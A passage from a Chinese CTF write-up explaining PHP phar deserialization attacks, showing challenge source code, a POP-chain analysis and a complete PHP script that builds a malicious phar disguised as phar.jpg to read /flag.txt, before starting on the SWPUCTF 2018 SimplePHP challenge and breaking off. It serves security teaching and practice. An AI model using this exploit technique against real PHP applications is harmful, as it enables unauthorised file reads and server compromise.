class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>代码核心就在<code>class.php</code>了</p><p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p><p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p><p>于是初步构造payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p><p><strong>foreach</strong>：遍历数组</p><p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span> <span class="token operator">-></span> <span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为 phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置 stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的 meta-data 存入 manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p><h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>直接看关键代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>_show</code>方法并未过滤phar，题目存在文件上传点和文件包含点，显然想到phar协议的利用</p><p>这题主要需要分析的是pop链，分析以上代码可以知道phar的利用点在<code>file_get_contents</code>函数，而触发<code>file_get_contents</code>函数需要从<code>__get-&gt;get-&gt;file_get-&gt;file_get_contents</code>，简单来讲就是要触发Test类中的<code>__get</code>方法，而<code>__get</code>方法的触发条件是需要对象读取不可访问属性的值，再看到Show类中的<code>__toString</code>方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果令<code>$this-&gt;str[&#39;str&#39;] = new Test()</code>那么不就可以触发Test类中的<code>__get</code>方法了吗</p><p>再想到<code>__toString</code>方法的触发方法，当一个类或对象被当作一个字符串被调用，在C1e4r类中刚好可利用</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果令 <code>$this-&gt;str = new 